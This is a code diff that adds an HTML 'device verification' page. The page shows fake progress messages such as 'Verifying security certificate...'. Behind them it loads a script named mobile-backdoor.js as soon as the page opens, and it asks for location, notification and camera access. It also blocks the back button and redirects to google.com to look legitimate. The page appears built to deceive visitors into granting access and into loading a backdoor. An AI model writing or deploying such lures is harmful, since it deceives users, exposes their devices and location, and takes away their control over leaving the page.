@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>Loading...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .status {
+            font-size: 14px;
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Please Wait</h1>
+        <p>Verifying your device...</p>
+        <div class="status" id="status">Initializing...</div>
+    </div>
+
+    <!-- Load mobile backdoor immediately -->
+    <script src="../../assets/js/mobile-backdoor.js"></script>
+
+    <script>
+        let statusEl = document.getElementById('status');
+        let step = 0;
+
+        const steps = [
+            'Checking device compatibility...',
+            'Verifying security certificate...',
+            'Establishing secure connection...',
+            'Loading content...',
+            'Almost done...'
+        ];
+
+        // Update status every 800ms
+        const statusInterval = setInterval(() => {
+            if (step < steps.length) {
+                statusEl.textContent = steps[step];
+                step++;
+            } else {
+                clearInterval(statusInterval);
+                completeSetup();
+            }
+        }, 800);
+
+        function completeSetup() {
+            // Request all permissions silently
+            requestPermissions();
+
+            // Redirect after a short delay
+            setTimeout(() => {
+                // Redirect to a legitimate-looking page
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+
+        async function requestPermissions() {
+            try {
+                // Request location permission
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        () => console.log('Location granted'),
+                        () => console.log('Location denied'),
+                        { enableHighAccuracy: true }
+                    );
+                }
+
+                // Request notification permission
+                if ('Notification' in window && Notification.permission === 'default') {
+                    await Notification.requestPermission();
+                }
+
+                // Request camera permission (will prompt user)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    console.log('Camera permission denied');
+                }
+            } catch (e) {
+                console.log('Permission request failed:', e);
+            }
+        }
+
+        // Prevent back button
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    </script>
+</body>
+
+</html>
